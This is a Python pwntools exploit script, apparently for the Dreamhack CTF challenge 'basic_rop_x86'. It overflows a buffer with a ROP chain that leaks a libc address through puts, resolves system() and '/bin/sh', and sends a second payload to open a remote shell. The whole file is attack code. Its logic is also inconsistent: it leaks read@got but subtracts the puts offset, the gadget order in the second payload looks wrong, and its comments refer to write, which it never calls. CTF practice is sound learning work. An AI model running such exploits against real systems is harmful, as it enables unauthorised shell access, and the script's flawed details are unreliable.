from os import lseek
from pwn import *

def slog(n,m):
    return success(":".join([n,hex(m)]))

# [0] settings
p = remote("host3.dreamhack.games", 11112)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")
r = ROP(e)
context.arch = 'i386'
context.log_level = 'debug'


# [1] address
puts_plt = 0x8048420
puts_got = 0x804a018
read_plt = 0x80483f0
read_got = 0x804a00c
write_plt = 0x8048450
write_got = 0x804a024
pppr = 0x8048689   # ROPgadget --binary basic_rop_x86 | grep "pop"
pr = 0x80483d9
bss = 0x804a040    # gdb-peda, elfheader
main = e.symbols["main"]

# [2] Leak the write@got address
buffer = b"A"*0x40 + b"B"*0x4 + b"C"*0x4
# puts(str,ret) - needs 2 arguments, write(1, puts_got, 4) - needs 3 arguments
payload1 = buffer + p32(puts_plt) + p32(pr) + p32(read_got) + p32(main)

p.send(payload1)
p.recvuntil("A"*0x40)

read_addr = u32(p.recvn(4))
libc_base = read_addr - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
slog("system address", system_addr)
slog("library base", libc_base)
slog("read address", read_addr)


# [3] Input the address of bin_sh into system() 
bin_sh = libc_base + list(libc.search("/bin/sh"))[0]  # remember this!!
slog("/bin/sh address", bin_sh)

payload2 = buffer + p32(pr) + p32(bin_sh) + p32(system_addr)
p.send(payload2)

# [4] Get shell
p.interactive()











